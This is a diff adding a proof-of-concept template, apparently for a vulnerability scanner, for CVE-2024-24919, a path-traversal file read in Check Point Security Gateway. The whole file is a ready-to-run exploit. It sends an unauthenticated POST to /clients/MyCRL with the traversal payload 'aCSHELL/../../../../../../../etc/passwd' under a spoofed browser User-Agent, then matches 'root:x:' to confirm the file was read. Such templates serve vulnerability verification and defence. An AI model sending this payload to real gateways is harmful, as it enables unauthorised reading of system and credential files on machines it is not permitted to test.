@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "验证 Check Point Security Gateway 路径遍历任意文件读取漏洞（CVE-2024-24919）。攻击者无需认证，向 /clients/MyCRL 发送 POST 请求，利用 aCSHELL/../../../../../../../ 路径穿越读取 /etc/passwd 等敏感文件。本 PoC 仅做安全无损读取验证。"
+id = "POC-AVE-2024-0033"
+name = "Check Point Security Gateway 任意文件读取漏洞 PoC"
+severity = "high"
+tags = ["ave-2024-0033"]
+vuln_id = [
+    "CVE-2024-24919",
+    "AVE-2024-0033",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/clients/MyCRL"
+protocol = "http"
+
+[poc.requests.body]
+content = "aCSHELL/../../../../../../../etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:x:",
+    "nobody:x:",
+]
